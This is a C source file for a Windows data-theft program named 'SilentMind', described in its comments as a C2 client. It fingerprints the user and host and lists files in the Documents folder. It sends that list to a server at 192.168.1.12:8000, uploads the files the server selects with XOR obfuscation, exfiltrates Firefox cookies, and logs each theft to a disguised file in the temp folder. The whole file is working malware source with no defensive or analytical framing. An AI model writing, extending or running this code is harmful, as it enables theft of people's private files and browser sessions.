#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <lmcons.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wchar.h>
#include "encrypt.h"
#include "firefox_cookies.h"
// now you can use xor_encrypt(...) without redefining it
#include <wchar.h>

// UTF-16 (Windows wide) -> UTF-8 into out (cap bytes). Returns bytes written (excl. NUL).
static int w2u8(const wchar_t *ws, char *out, int cap) {
    int need = WideCharToMultiByte(CP_UTF8, 0, ws, -1, NULL, 0, NULL, NULL);
    if (need <= 0) return 0;
    if (need > cap) need = cap;
    int wrote = WideCharToMultiByte(CP_UTF8, 0, ws, -1, out, need, NULL, NULL);
    return wrote > 0 ? wrote - 1 : 0;
}

// Escape only quotes and backslashes for JSON; DO NOT drop non-ASCII
static void json_escape_inplace(char *s, int cap) {
    char buf[2048];
    int j=0;
    for (int i=0; s[i] && j < (int)sizeof(buf)-2; i++) {
        if (s[i]=='\"' || s[i]=='\\') { buf[j++]='\\'; buf[j++]=s[i]; }
        else { buf[j++]=s[i]; }
    }
    buf[j]=0;
    strncpy(s, buf, cap-1); s[cap-1]=0;
}

#pragma comment(lib, "wininet.lib")

#define MAX_FILES 50
#define MAX_PATH_LEN 260
#define XOR_KEY 0x5A



// Writes exfil log to %TEMP%\syslog.dat
void log_exfil_event(const char *filename) {
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);

    char logPath[MAX_PATH];
    snprintf(logPath, MAX_PATH, "%s\\syslog.dat", tempPath);

    FILE *logFile = fopen(logPath, "a+");
    if (logFile) {
        time_t now = time(NULL);
        struct tm *lt = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", lt);
        fprintf(logFile, "[%s] Exfiltrated: %s\n", timestamp, filename);
        fclose(logFile);
    }
}

// Reads response into dynamically allocated buffer
char *read_http_response(HINTERNET hRequest) {
    DWORD downloaded = 0;
    char buffer[4096];

    size_t cap = 8192;
    size_t total = 0;
    char *response = (char *)malloc(cap);
    if (!response) return NULL;

    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &downloaded) && downloaded > 0) {
        if (total + downloaded + 1 > cap) {            // +1 for '\0'
            size_t newcap = cap * 2;
            while (total + downloaded + 1 > newcap) newcap *= 2;
            char *tmp = (char *)realloc(response, newcap);
            if (!tmp) { free(response); return NULL; }
            response = tmp; cap = newcap;
        }
        memcpy(response + total, buffer, downloaded);
        total += downloaded;
    }
    response[total] = '\0';
    return response;
}


// Main C2 client logic
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char username[UNLEN + 1] = {0};
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD comp_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(computerName, &comp_len);

    char os[] = "Windows";
    // Wide path to Documents
    wchar_t wdocPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, wdocPath);

    // Wide enumeration
    WIN32_FIND_DATAW fdata;
    wchar_t wsearch[MAX_PATH];
    _snwprintf(wsearch, MAX_PATH, L"%s\\*", wdocPath);

    char fileList[8192] = "[";
    int count = 0;

    HANDLE hFind = FindFirstFileW(wsearch, &fdata);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                // Build full wide path
                wchar_t wfull[MAX_PATH];
                _snwprintf(wfull, MAX_PATH, L"%s\\%s", wdocPath, fdata.cFileName);

                // Size + time
                DWORD size = fdata.nFileSizeLow;
                SYSTEMTIME stUTC, stLocal;
                FileTimeToSystemTime(&fdata.ftLastWriteTime, &stUTC);
                SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);

                char modTime[64];
                _snprintf(modTime, sizeof(modTime), "%04d-%02d-%02d %02d:%02d",
                        stLocal.wYear, stLocal.wMonth, stLocal.wDay,
                        stLocal.wHour, stLocal.wMinute);

                // Convert wide name/path → UTF-8 for JSON
                char name_u8[MAX_PATH_LEN];  w2u8(fdata.cFileName, name_u8, sizeof(name_u8));
                char path_u8[MAX_PATH_LEN];  w2u8(wfull,          path_u8, sizeof(path_u8));
                json_escape_inplace(name_u8, sizeof(name_u8));
                json_escape_inplace(path_u8, sizeof(path_u8));

                char entry[512];
                _snprintf(entry, sizeof(entry),
                    "{\"name\":\"%s\", \"path\":\"%s\", \"size\":%lu, \"modified\":\"%s\"},",
                    name_u8, path_u8, size, modTime);

                strncat(fileList, entry, sizeof(fileList) - strlen(fileList) - 1);
                if (++count >= MAX_FILES) break;
            }
        } while (FindNextFileW(hFind, &fdata));
        FindClose(hFind);
    }

    if (fileList[strlen(fileList)-1] == ',')
        fileList[strlen(fileList)-1] = '\0';
    strcat(fileList, "]");



    char postData[16384];
    snprintf(postData, sizeof(postData),
        "{\"fingerprint\": {\"user\": \"%s\", \"host\": \"%s\", \"os\": \"%s\"}, \"files\": %s}",
        username, computerName, os, fileList);

    HINTERNET hSession = InternetOpen("SilentMind", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    DWORD to = 120000; // 120s
    InternetSetOption(hSession, INTERNET_OPTION_CONNECT_TIMEOUT, &to, sizeof(to));
    InternetSetOption(hSession, INTERNET_OPTION_SEND_TIMEOUT,    &to, sizeof(to));
    InternetSetOption(hSession, INTERNET_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));

    HINTERNET hConnect = InternetConnect(hSession, "192.168.1.12", 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/decision", NULL, NULL, NULL,
                                         INTERNET_FLAG_RELOAD, 0);

    const char* headers = "Content-Type: application/json\r\n";
    HttpSendRequest(hRequest, headers, strlen(headers), postData, strlen(postData));
    char *response = read_http_response(hRequest);

    // Extract file names to exfiltrate from response//  
    // === BEGIN: robust parse + exfil ===
    if (!response) {
        // Optional debug:
        MessageBoxA(NULL, "No response from server / OOM", "SilentMind", MB_OK);
    } else {
        // Optional debug to inspect JSON:
        MessageBoxA(NULL, response, "Decision JSON", MB_OK);

        // Find the "exfiltrate" array
        char *p = strstr(response, "\"exfiltrate\"");
        if (!p) p = strstr(response, "\"exfiltration\"");
        if (p) {
            p = strchr(p, '[');
            if (p) {
                p++; // move past '['

                while (*p) {
                    // skip spaces and commas
                    while (isspace((unsigned char)*p) || *p == ',') p++;
                    if (*p == ']') break; // end of array

                    if (*p == '\"') {
                        p++; // start of quoted filename
                        char name[MAX_PATH_LEN] = {0};
                        int i = 0;
                        while (*p && *p != '\"' && i < (MAX_PATH_LEN - 1)) {
                            name[i++] = *p++;
                        }
                        name[i] = '\0';
                        if (*p == '\"') p++; // consume closing quote

                        // Build absolute path under Documents
                        // 'name' is UTF-8 from the JSON
                        wchar_t wname[MAX_PATH];
                        MultiByteToWideChar(CP_UTF8, 0, name, -1, wname, MAX_PATH);

                        wchar_t wupload[MAX_PATH];
                        _snwprintf(wupload, MAX_PATH, L"%s\\%s", wdocPath, wname);

                        FILE *f = _wfopen(wupload, L"rb");

                        if (!f) {
                            // Optional debug:
                            MessageBoxW(NULL, wupload, L"fopen failed", MB_OK);
                        } else {
                            // get file size
                            if (fseek(f, 0, SEEK_END) == 0) {
                                long lsize = ftell(f);
                                if (lsize > 0) {
                                    rewind(f);
                                    DWORD size = (DWORD)lsize;
                                    char *buf = (char *)malloc(size);
                                    if (buf) {
                                        size_t rd = fread(buf, 1, size, f);
                                            // --- STREAMED UPLOAD to /api/upload (handles large files) ---
                                        // --- STREAMED UPLOAD to /api/upload (handles large files) ---
                                        
                                            HINTERNET hReq = HttpOpenRequest(hConnect, "POST", "/api/upload", NULL, NULL, NULL,
                                                                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
                                            if (!hReq) { fclose(f); /* couldn't open request */ continue; }

                                            // Build X-Filename-B64 header from UTF-8 filename
                                            const char *name_utf8_src = name;  // if your variable is 'clean', use that
                                            static const char b64tbl[] =
                                                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                                            char b64[1024];
                                            int i = 0, j = 0;
                                            unsigned char a3[3], a4[4];
                                            const unsigned char *p = (const unsigned char *)name_utf8_src;
                                            int remaining = (int)strlen(name_utf8_src);
                                            while (remaining--) {
                                                a3[i++] = *p++;
                                                if (i == 3) {
                                                    a4[0] = (a3[0] & 0xFC) >> 2;
                                                    a4[1] = ((a3[0] & 0x03) << 4) | ((a3[1] & 0xF0) >> 4);
                                                    a4[2] = ((a3[1] & 0x0F) << 2) | ((a3[2] & 0xC0) >> 6);
                                                    a4[3] =  (a3[2] & 0x3F);
                                                    for (i = 0; i < 4; i++) b64[j++] = b64tbl[a4[i]];
                                                    i = 0;
                                                }
                                            }
                                            if (i) {
                                                for (int k = i; k < 3; k++) a3[k] = 0;
                                                a4[0] = (a3[0] & 0xFC) >> 2;
                                                a4[1] = ((a3[0] & 0x03) << 4) | ((a3[1] & 0xF0) >> 4);
                                                a4[2] = ((a3[1] & 0x0F) << 2) | ((a3[2] & 0xC0) >> 6);
                                                a4[3] =  (a3[2] & 0x3F);
                                                for (int k = 0; k < i + 1; k++) b64[j++] = b64tbl[a4[k]];
                                                while (i++ < 3) b64[j++] = '=';
                                            }
                                            b64[j] = '\0';

                                            char hdr[1024];
                                            _snprintf(hdr, sizeof(hdr),
                                                    "Content-Type: application/octet-stream\r\n"
                                                    "X-Filename-B64: %s\r\n", b64);

                                            // Get file size (64-bit)
                                            if (_fseeki64(f, 0, SEEK_END) != 0) { InternetCloseHandle(hReq); fclose(f); continue; }
                                            long long fsize_ll = _ftelli64(f);
                                            if (fsize_ll < 0) { InternetCloseHandle(hReq); fclose(f); continue; }
                                            _fseeki64(f, 0, SEEK_SET);

                                            INTERNET_BUFFERS ib;
                                            ZeroMemory(&ib, sizeof(ib));
                                            ib.dwStructSize    = sizeof(ib);
                                            ib.lpcszHeader     = hdr;
                                            ib.dwHeadersLength = (DWORD)strlen(hdr);
                                            ib.dwHeadersTotal  = ib.dwHeadersLength;
                                            ib.dwBufferTotal   = (DWORD)fsize_ll; // ok up to 4GB

                                            if (!HttpSendRequestEx(hReq, &ib, NULL, HSR_INITIATE, 0)) {
                                                InternetCloseHandle(hReq);
                                                fclose(f);
                                                continue;
                                            }

                                            // Stream in chunks, XOR on the fly
                                            static const size_t CHUNK = 64 * 1024;
                                            unsigned char *chunkbuf = (unsigned char *)malloc(CHUNK);
                                            if (!chunkbuf) {
                                                HttpEndRequest(hReq, NULL, 0, 0);
                                                InternetCloseHandle(hReq);
                                                fclose(f);
                                                continue;
                                            }

                                            static const char KEY[] = "SILENTMIND";
                                            const int key_len = (int)(sizeof(KEY) - 1);
                                            long long key_pos = 0;
                                            BOOL write_ok = TRUE;

                                            for (;;) {
                                                size_t n = fread(chunkbuf, 1, CHUNK, f);
                                                if (n == 0) break;

                                                for (size_t idx = 0; idx < n; ++idx)
                                                    chunkbuf[idx] ^= (unsigned char)KEY[(key_pos + (long long)idx) % key_len];
                                                key_pos += (long long)n;

                                                DWORD written = 0;
                                                if (!InternetWriteFile(hReq, chunkbuf, (DWORD)n, &written) || written != n) {
                                                    write_ok = FALSE;
                                                    break;
                                                }
                                            }

                                            free(chunkbuf);
                                            fclose(f);

                                            BOOL end_ok = HttpEndRequest(hReq, NULL, 0, 0);

                                            DWORD sc = 0, sclen = sizeof(sc);
                                            BOOL have_sc = HttpQueryInfo(hReq,
                                                HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                                                &sc, &sclen, NULL);

                                            InternetCloseHandle(hReq);

                                            if (write_ok && end_ok && have_sc && sc == 200) {
                                                log_exfil_event(name);  // or 'clean'
                                            } else {
                                                char msg[256];
                                                _snprintf(msg, sizeof(msg),
                                                        "Upload failed (write_ok=%d,end_ok=%d,HTTP=%lu)",
                                                        (int)write_ok, (int)end_ok, have_sc ? sc : 0UL);
                                                MessageBoxA(NULL, msg, "SilentMind", MB_OK);
                                            } 
                                        }                    
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    // === END: robust parse + exfil ===

    // Exfiltrate Firefox cookies
    if (exfiltrate_firefox_cookies("192.168.1.12", 8000)) {
        log_exfil_event("firefox_cookies.txt");
    }
    
    free(response);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    return 0;
}
